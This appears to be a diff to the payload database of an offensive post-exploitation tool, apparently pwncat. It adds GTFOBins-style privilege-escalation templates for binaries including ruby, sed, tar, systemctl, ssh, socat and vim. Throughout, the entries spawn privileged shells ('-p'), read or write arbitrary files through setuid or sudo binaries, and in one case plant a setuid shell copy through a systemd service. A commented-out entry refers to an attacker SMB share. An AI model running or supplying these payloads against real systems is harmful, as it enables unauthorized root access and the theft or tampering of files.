@@ -260,34 +260,6 @@
 		}
 	],
 //-------------------------------------------------------------------
-	"socat": [
-		{
-			"type": "shell",
-			"payload": "{command}",
-			"args": ["STDIN", "EXEC:{shell},nofork,pty"],
-			"exit": "exit\n"
-		},
-		{
-			"type": "read",
-			"payload": "{command}",
-			"args": ["-u", "FILE:{lfile}", "STDOUT"]
-		},
-		{
-			"type": "write",
-			"stream": "print",
-			"payload": "{command} 2>/dev/null",
-			"args": ["-u", "STDIN", "CREATE:{lfile}"],
-			"exit": "{ctrl_d}"
-		},
-		{
-			"type": "write",
-			"stream": "base64",
-			"payload": "{base64} -d | {command} 2>/dev/null",
-			"args": ["-u", "STDIN", "CREATE:{lfile}"],
-			"exit": "{ctrl_d}"
-		}
-	],
-//-------------------------------------------------------------------
 	"chmod": [
 		{
 			"type": "shell",
@@ -872,6 +844,394 @@
 
 
 //-------------------------------------------------------------------
+	"ruby": [
+		// if ruby is setuid, it will not let you run with -e or pass
+		// commands piped through stdin... so we must create a temporary script
+		
+		{
+			"type": "shell",
+			"payload": "TF=$({mktemp}); echo 'exec \"{shell} -p\"' > $TF; {command}",
+			"args": ["$TF"]
+		},
+		{
+			"type": "read",
+			"stream":"print",
+			"payload": "TF=$({mktemp}); echo 'puts File.read(\"{lfile}\")' > $TF; {command}",
+			"args": ["$TF"]
+		},
+		{
+			"type": "write",
+			"stream":"print",
+			"payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {command}",
+			"args": ["$TF"],
+			"exit": "{ctrl_d}{ctrl_d}"
+
+		},
+		{
+			"type": "write",
+			"stream":"base64",
+			"payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {base64} -d | {command}",
+			"args": ["$TF"],
+			"exit": "{ctrl_d}{ctrl_d}"
+		}
+	],
+	"ruby2.5": [
+		// if ruby is setuid, it will not let you run with -e or pass
+		// commands piped through stdin... so we must create a temporary script
+		
+		{
+			"type": "shell",
+			"payload": "TF=$({mktemp}); echo 'exec \"{shell} -p\"' > $TF; {command}",
+			"args": ["$TF"]
+		},
+		{
+			"type": "read",
+			"stream":"print",
+			"payload": "TF=$({mktemp}); echo 'puts File.read(\"{lfile}\")' > $TF; {command}",
+			"args": ["$TF"]
+		},
+		{
+			"type": "write",
+			"stream":"print",
+			"payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {command}",
+			"args": ["$TF"],
+			"exit": "{ctrl_d}{ctrl_d}"
+
+		},
+		{
+			"type": "write",
+			"stream":"base64",
+			"payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {base64} -d | {command}",
+			"args": ["$TF"],
+			"exit": "{ctrl_d}{ctrl_d}"
+		}
+	],
+//-------------------------------------------------------------------
+// run-mailcap should also be implemented.... it errors on my machine
+// (I do not know why) and neglected to test it to implement it.
+//
+//-------------------------------------------------------------------
+	"run-parts": [
+		// run-parts separates the shell's folder and filename, so {shell}
+		// as a template option will not work well. I just get around this 
+		// by trying bash first... if that fails, fall back to sh.
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["--new-session", "--regex", "'^bash$'", "/bin", "--arg='-p'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["--new-session", "--regex", "'^sh$'", "/bin", "--arg='-p'"]
+		}
+	],
+
+//-------------------------------------------------------------------
+	"scp": [
+		{
+			"type": "shell",
+			"payload": "TF=$({mktemp}); echo '{shell} 0<&2 1>&2' > $TF; {chmod} +x \"$TF\"; {command}",
+			"args": ["-S", "$TF", "x", "y:"]
+		}
+	],
+//-------------------------------------------------------------------
+	"screen": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["{shell}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"script": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-qc", "{shell}", "/dev/null"]
+		}
+	],
+
+//-------------------------------------------------------------------
+	"sed": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-n", "'1e exec {shell} -p 1>&0'", "/etc/hosts"]
+		},
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["''", "{lfile}"]
+		},
+		{
+			"type": "write",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["-n", "'s/\\(.\\)/\\1/w {lfile}'" ],
+			"exit": "{ctrl_d}{ctrl_d}"
+		}
+	],
+//-------------------------------------------------------------------
+	"service": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["../../{shell} -p"]
+		}
+	],
+//-------------------------------------------------------------------
+	"setarch": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["$({arch})", "{shell} -p"]
+		}
+	],
+//-------------------------------------------------------------------
+	"sftp": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-o", "ProxyCommand=';{shell} -p 0<&2 1>&2'", "x"]
+		}
+	],
+//-------------------------------------------------------------------
+	"shuf": [
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["-z", "{lfile}"]
+		}
+		// shuf CAN file write with... 
+		//     LFILE=file_to_write
+		//     sudo shuf -e DATA -o "$LFILE"
+		// but it replaces spaces with newlines...
+		// which could be pretty problematic. I have left out that technique.
+		// The other technique, below, adds null-bytes at the end of each line
+		// This will make the "print" stream fail. and it will not work
+		// for "base64" or "raw" streams either. :/
+		// {
+		// 	"type": "write",
+		// 	"stream": "base64",
+		// 	"payload": "{base64} -d | {command}",
+		// 	"args": ["-z", "-o", "{lfile}"],
+		// 	"exit":"{ctrl_d}{ctrl_d}"
+		// }
+	],
+//-------------------------------------------------------------------
+// smbclient requires an attacker share or SMB/CIFS server be available.
+// This would likely be better as its own privesc method, so one share
+// can be automatically started to use this technique.
+	// "smbclient": [
+	// 	{
+	// 		"type": "shell",
+	// 		"payload": "{command} '\\\\attacker\\share'",
+	// 		"args": [],
+	// 		"input":"!{shell} -p"
+	// 	},
+	// ],
+
+//-------------------------------------------------------------------
+	"socat": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["STDIN", "EXEC:{shell},nofork,pty"],
+			"exit": "exit\n"
+		},
+		{
+			"type": "read",
+			"payload": "{command}",
+			"args": ["-u", "FILE:{lfile}", "STDOUT"]
+		},
+		{
+			"type": "write",
+			"stream": "print",
+			"payload": "{command} 2>/dev/null",
+			"args": ["-u", "STDIN", "CREATE:{lfile}"],
+			"exit": "{ctrl_d}"
+		},
+		{
+			"type": "write",
+			"stream": "base64",
+			"payload": "{base64} -d | {command} 2>/dev/null",
+			"args": ["-u", "STDIN", "CREATE:{lfile}"],
+			"exit": "{ctrl_d}"
+		}
+	],
+//-------------------------------------------------------------------
+	"soelim": [
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command} | {tail} -n +2",
+			"args": ["{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"sort": [
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["-m","{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"sqlite3": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["/dev/null", "'.shell {shell} -p'"]
+		},
+		{
+			"type": "read",	
+			"stream":"print",
+			"payload": "echo -e \"CREATE TABLE t(line TEXT);\\n.import {lfile} t\\nSELECT * FROM t;\\n\" | {command}",
+			"args": [""]
+		}
+		// https://gtfobins.github.io/gtfobins/sqlite3
+		// sqlite3 could POTENTIALLY write a file with this sort of syntax
+		//   LFILE=file_to_write
+		//   sqlite3 /dev/null -cmd ".output $LFILE" 'select "DATA";'
+		// but getting this as stdin might be difficult. Since it already
+		// has shell capabaility, it can write after-the-fact and I won't
+		// try to finagle this.
+	],
+//-------------------------------------------------------------------
+	"ssh": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-o", "ProxyCommand=';{shell} -p 0<&2 1>&2'", "x"]
+		}
+	],
+//-------------------------------------------------------------------
+	"start-stop-daemon": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-n", "$RANDOM", "-S", "-x", "{shell}", "--", "-p"]
+		}
+	],
+//-------------------------------------------------------------------
+	"stdbuf": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-i0", "{shell}", "-p"]
+		}
+	],
+//-------------------------------------------------------------------
+	"strace": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-o", "/dev/null", "{shell}", "-p"]
+		}
+	],
+//-------------------------------------------------------------------
+	"strings": [
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["{lfile}"]
+		}
+	],
+	"x86_64-linux-gnu-strings": [
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["{lfile}"]
+		}
+	],
+	"x86-linux-gnu-strings": [
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"systemctl": [
+		{
+			"type": "shell",
+			"payload": "TF=$({mktemp} -u).service; TS=$({mktemp} -u); echo -e \"[Service]\\nType=oneshot\\nExecStart={shell} -c 'cp {shell} $TS; {chmod} +sx $TS;'\\n[Install]\\nWantedBy=multi-user.target\" > $TF; {command} link $TF; {command} enable --now $TF; $TS -p",
+			"args": []
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"input":"!{shell} -p\n",
+			"exit":"exit\n{ctrl_c}",
+			"args": []
+		}
+	],
+//-------------------------------------------------------------------
+	"tac": [
+		{
+			"type": "read",
+			"stream":"raw",
+			"payload": "{command}",
+			"args": ["-s", "'_-_PWNCAT_RANDOM_DELIM_-_'", "{lfile}"]
+		}
+	],
+
+//-------------------------------------------------------------------
+	"tail": [
+		{
+			"type": "read",
+			"stream":"raw",
+			"payload": "{command}",
+			"args": ["-c1GB", "{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"tar": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-cf", "/dev/null", "/dev/null", "--checkpoint=1", "--checkpoint-action=exec={shell} -p"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["xf", "/dev/null", "-I", "'{shell} -p -c \"{shell} -p <&2 1>&2\"'"]
+		},
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command} 2>&1",
+			"args": ["xf", "{lfile}", "-I", "'{sh} -c \"{cat} 1>&2\"'"]
+		}
+		// This requires invoking `tar` twice... before and after a pipe.
+		// With sudo, this would not work well... and as SETUID, the file does not
+		// seem to keep the permissions as the elevated user. I'll remove this,
+		// because since it can get a shell, it can just "write a file" naturally.
+		// {
+		// 	"type": "write",
+		// 	"stream":"base64",
+		// 	"payload": "TF=$({mktemp}); {base64} -d > $TF; {command} | {tar} x -P",
+		// 	"args": ["c", "--xform", "\"s@.*@{lfile}@\"", "-OP", "$TF"],
+		// 	"exit": "{ctrl_d}{ctrl_d}"
+		// }
+	],
+//-------------------------------------------------------------------
+	"taskset": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["1", "{shell}", "-p"]
+		}
+	],
+
+//-------------------------------------------------------------------
 	"tclsh": [
 		{
 			"type": "shell",
@@ -1049,6 +1409,43 @@
 		}
 	],
 	"vim.basic": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-c", "':!exec {shell} -p'", "-c", "':q'"],
+			// Include an extra newline to be sure to exit vim itself.
+			"exit": "exit\n\n"
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-c", "':py3 import os; os.execl(\"{shell}\", \"{shell}\", \"-p\", \"-c\", \"reset; exec {shell} -p\")'", "-c", "'quit'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-c", "':py import os; os.execl(\"{shell}\", \"{shell}\", \"-p\", \"-c\", \"reset; exec {shell} -p\")'", "-c", "'quit'"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-c", "':lua os.execute(\"reset; exec {shell}\")'", "-c", "'quit'"]
+		},
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["-es" ,"'+%print'" ,"'+:q!'", "{lfile}"]
+		},
+		{
+			"type": "write",
+			"stream": "print",
+			"payload": "{cat} - | {command}",
+			"args": ["-es" ,"'+%print'" ,"'+:w! {lfile}'", "'+:q!'", "/dev/stdin"],
+			"exit": "{ctrl_d}"
+		}
+	],
+	"rvim": [
 		{
 			"type": "shell",
 			"payload": "{command}",
